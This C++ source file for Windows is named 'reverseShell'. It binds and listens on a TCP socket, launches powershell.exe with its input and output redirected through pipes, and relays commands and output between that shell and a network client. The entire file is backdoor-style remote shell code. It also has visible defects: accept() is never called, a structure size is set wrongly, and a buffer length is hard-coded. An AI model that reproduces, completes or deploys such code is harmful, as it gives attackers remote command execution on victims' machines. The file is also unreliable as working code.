#include <ws2tcpip.h>
#include <windows.h>

#include "reverseShell.h"
//#include "utils.hpp"

reverseShell_t shell = {};

static void cleanUp(void) {
	if (shell.addrResult) freeaddrinfo(shell.addrResult);

	if (shell.listenSocket) closesocket(shell.listenSocket);

	if (shell.clientSocket) closesocket(shell.clientSocket);

	if (shell.childRead) CloseHandle(shell.childRead);

	if (shell.childWrite) CloseHandle(shell.childWrite);

	if (shell.parentRead) CloseHandle(shell.parentRead);

	if (shell.parentWrite) CloseHandle(shell.parentWrite);

	WSACleanup();
}

static BYTE getAddr(void) {
	shell.addrHints.ai_flags = AI_PASSIVE;
	shell.addrHints.ai_family = AF_INET;
	shell.addrHints.ai_socktype = SOCK_STREAM;
	shell.addrHints.ai_protocol = IPPROTO_TCP;

	if (getaddrinfo(HOSTNAME, PORT, &shell.addrHints, &shell.addrResult)) {
		//journalReport(L"Addrinfo failure\n");
		return (FAILURE);
	} else {
		//journalReport(L"Addrinfo success\n");
	}
	return (SUCCESS);
}

static BYTE initWinSockDll(void) {
	WSADATA wsaData = {};

	if (WSAStartup(MAKEWORD(2,2), &wsaData))
		return (FAILURE);
	return (SUCCESS);
}

static BYTE createSocket(void) {
	if (getAddr() == FAILURE)
		return (FAILURE);
	
	shell.listenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (shell.listenSocket == INVALID_SOCKET)
		return (FAILURE);
	return (SUCCESS);
}

static BYTE bindSocket(void) {
	if (bind(
			shell.listenSocket,
			shell.addrResult->ai_addr,
			(int)shell.addrResult->ai_addrlen
			) == SOCKET_ERROR
		) {
			//journalReport(L"Failed to bind socket\n");
			return (FAILURE);
		}
	return (SUCCESS);
}

static BYTE listenSocket(void) {
	if (listen(shell.listenSocket, 1)) {
		//journalReport(L"Failed to listen\n");
		return (FAILURE);
	}
	//journalReport(L"Listenning to socket\n");
	return (SUCCESS);
}

static BYTE initNetworking(void) {
	if (initWinSockDll() == FAILURE) return (FAILURE);

	if (createSocket() == FAILURE) return (FAILURE);

	if (bindSocket() == FAILURE) return (FAILURE);

	if (listenSocket() == FAILURE) return (FAILURE);

	return (SUCCESS);
}

static void formatSecurityAttributes(void) {
	shell.secAttributes.nLength = sizeof(SECURITY_ATTRIBUTES);
	shell.secAttributes.lpSecurityDescriptor = NULL;
	shell.secAttributes.bInheritHandle = TRUE;
}

static BYTE createPipes(void) {

	formatSecurityAttributes();

	if (!CreatePipe(&shell.parentRead, &shell.childWrite,
					&shell.secAttributes, 0)) {
			return (FAILURE);
	}
	if (!CreatePipe(&shell.childRead, &shell.parentWrite,
					&shell.secAttributes, 0)) {
			return (FAILURE);
	}

	SetHandleInformation(shell.parentRead, HANDLE_FLAG_INHERIT, 0);
	SetHandleInformation(shell.parentWrite, HANDLE_FLAG_INHERIT, 0);

	return (SUCCESS);
}

static void formatProcessAttributes(void) {
	shell.startupInfo.cb = sizeof(shell);
	shell.startupInfo.dwFlags = STARTF_USESTDHANDLES;
	shell.startupInfo.hStdInput = shell.childRead;
	shell.startupInfo.hStdOutput = shell.childWrite;
	shell.startupInfo.hStdError = shell.childWrite;
}

static BYTE createProcess(void) {

	formatProcessAttributes();

	wchar_t cmd[] = L"powershell.exe";

	if (!CreateProcessW(
		NULL,
		cmd,
		NULL, NULL,
		TRUE, 0,
		NULL, NULL,
		&shell.startupInfo,
		&shell.processInfo
	)) {
		return (FAILURE);
	} else {
		Sleep(2000); // Wait for the child to start normally
		CloseHandle(shell.childRead);
		CloseHandle(shell.childWrite);
	}
	return (SUCCESS);
}

static void initStopHandler(void) {
	shell.stopEventsignal = OpenEventA(
		SYNCHRONIZE,
		FALSE,
		PROCESS_STOP
	);
}

static BYTE initProcess(void) {

	initStopHandler();
	
	if (initNetworking() == FAILURE)
		return (FAILURE);
	
	if (createPipes() == FAILURE)
		return (FAILURE);

	if (createProcess() == FAILURE)
		return (FAILURE);

	return (SUCCESS);
}

DWORD WINAPI sender(LPVOID) {
	char buffer[BUFFER_SIZE] = {};
	DWORD bytes = 0;

	while (true) {
		//if (shell.g_stopRoutines == TRUE) return (SUCCESS);

		if (WaitForSingleObject(shell.stopEventsignal, 1000) == WAIT_OBJECT_0) {
			//shell.g_stopRoutines = TRUE;
			return (SUCCESS);
		}

		if (!ReadFile(shell.parentRead, buffer, BUFFER_SIZE-1, &bytes, NULL)) {
			//shell.g_stopRoutines = TRUE;
			return (FAILURE);
		}
		else {
			int clientSentBytes = send(shell.clientSocket, buffer, (int)bytes, NULL);
			if (clientSentBytes == SOCKET_ERROR) {
				//shell.g_stopRoutines = TRUE;
				return (FAILURE);
			}
		}
		ZeroMemory(buffer, 4046);
		bytes = 0;
	}
	return 0;
}

DWORD WINAPI listener(LPVOID) {
	char buffer[BUFFER_SIZE] = {};
	DWORD bytes = 0;

	while (true) {
		//if (shell.g_stopRoutines == TRUE) return (SUCCESS);

		if (WaitForSingleObject(shell.stopEventsignal, 1000) == WAIT_OBJECT_0) {
			//shell.g_stopRoutines = TRUE;
			return (SUCCESS);
		}

		int clientRecvBytes = recv(shell.clientSocket, buffer, BUFFER_SIZE-1, NULL);
		if (clientRecvBytes <= 0) {
			//shell.g_stopRoutines = TRUE;
			return (SUCCESS); // End of connection
		} else {

			if (!WriteFile(shell.parentWrite, buffer, (DWORD)clientRecvBytes, &bytes, NULL)) {
				//shell.g_stopRoutines = TRUE;
				return (FAILURE);
			}
		}
		ZeroMemory(buffer, 4046);
		bytes = 0;
	}
}
#include <iostream>

static void createThread(LPTHREAD_START_ROUTINE routineFuncAddr, PHANDLE threadHandle) {
	*threadHandle = CreateThread(
		NULL, 0,
		routineFuncAddr,
		NULL, 0, NULL
	);

	std::cout	<< "hThread value: " << *threadHandle << '\n';
}

static BYTE startRoutines(void) {
	createThread(listener, &shell.threadListener);
	if (shell.threadListener == INVALID_HANDLE_VALUE)
		return (FAILURE);
	std::cout	<< "after value: " << shell.threadListener << '\n';

	createThread(sender, &shell.threadSender);
	if (shell.threadSender == INVALID_HANDLE_VALUE)
		return (FAILURE);
	std::cout	<< "after value: " << shell.threadSender << '\n';

	HANDLE threads[] = {shell.threadListener, shell.threadSender};
	std::cerr	<< "Beef wait\n";
	if (!WaitForMultipleObjects(2, threads, TRUE, INFINITE)) {
		std::cerr	<< "Threads done\n";
		return (SUCCESS);
	}
	std::cerr	<< "After wait\n";

	return (SUCCESS);
}

int main() {

	std::cerr	<< "Entering main loop ? \n" << std::flush;
	while (true) {

		if (initProcess() == FAILURE) {
			cleanUp();
			return (EXIT_FAILURE);
		}
		std::cerr	<< "Init process done\n";

		if (startRoutines() == FAILURE) {
			cleanUp();
			return (EXIT_FAILURE);
		}
		std::cerr	<< "Routines launched\n";

		cleanUp();
		if (WaitForSingleObject(shell.stopEventsignal, 1000) == WAIT_OBJECT_0) {
			std::cerr	<< "Obj returned\n";
			return (SUCCESS);
		}
	}
	
	return (EXIT_SUCCESS);
}